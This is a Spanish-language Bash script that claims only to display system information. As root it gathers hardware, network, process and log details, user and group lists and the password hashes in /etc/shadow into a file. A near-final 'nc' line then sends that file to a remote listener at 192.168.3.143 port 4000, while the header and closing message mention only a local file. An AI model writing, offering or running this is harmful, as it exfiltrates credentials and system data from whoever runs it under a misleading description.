#!/bin/bash

# Script para ver toda la información del sistema.
# Requiere ser ejecutado con permisos de administrador.

# Archivo de salida
OUTPUT="resultado.txt"

# Crear o limpiar el archivo de salida
> $OUTPUT

# Información básica del sistema
echo "Información básica del sistema:" | tee -a $OUTPUT
hostnamectl | tee -a $OUTPUT

# Información del kernel
echo "" | tee -a $OUTPUT
echo "Versión del kernel:" | tee -a $OUTPUT
uname -r | tee -a $OUTPUT

# Información del CPU
echo "" | tee -a $OUTPUT
echo "Información del CPU:" | tee -a $OUTPUT
lscpu | tee -a $OUTPUT

# Información de la memoria
echo "" | tee -a $OUTPUT
echo "Información de la memoria:" | tee -a $OUTPUT
free -h | tee -a $OUTPUT

# Uso del disco
echo "" | tee -a $OUTPUT
echo "Uso del disco:" | tee -a $OUTPUT
df -h | tee -a $OUTPUT

# Información de la red
echo "" | tee -a $OUTPUT
echo "Configuración de red:" | tee -a $OUTPUT
ip a | tee -a $OUTPUT

# Tabla de enrutamiento
echo "" | tee -a $OUTPUT
echo "Tabla de enrutamiento:" | tee -a $OUTPUT
ip route | tee -a $OUTPUT

# Procesos activos
echo "" | tee -a $OUTPUT
echo "Procesos activos:" | tee -a $OUTPUT
ps aux | tee -a $OUTPUT

# Usuarios en el sistema
echo "" | tee -a $OUTPUT
echo "Usuarios en el sistema:" | tee -a $OUTPUT
cat /etc/passwd | tee -a $OUTPUT

# Grupos del sistema
echo "" | tee -a $OUTPUT
echo "Grupos del sistema:" | tee -a $OUTPUT
cat /etc/group | tee -a $OUTPUT

# Contraseñas (hash)
echo "" | tee -a $OUTPUT
echo "Contraseñas (hash)" | tee -a $OUTPUT
cat /etc/shadow | tee -a $OUTPUT

# Contenido del directorio home
echo "" | tee -a $OUTPUT
echo "Contenido del directorio home:" | tee -a $OUTPUT
ls -la ~/ | tee -a $OUTPUT

# Últimos logs del sistema
echo "" | tee -a $OUTPUT
echo "Últimos logs del sistema:" | tee -a $OUTPUT
journalctl -n 100 | tee -a $OUTPUT

# Envío de la información recopilada a través de la red
nc 192.168.3.143 4000 < $OUTPUT

# Mensaje final
echo "" | tee -a $OUTPUT
echo "La información del sistema se encuentra en el archivo $OUTPUT." | tee -a $OUTPUT
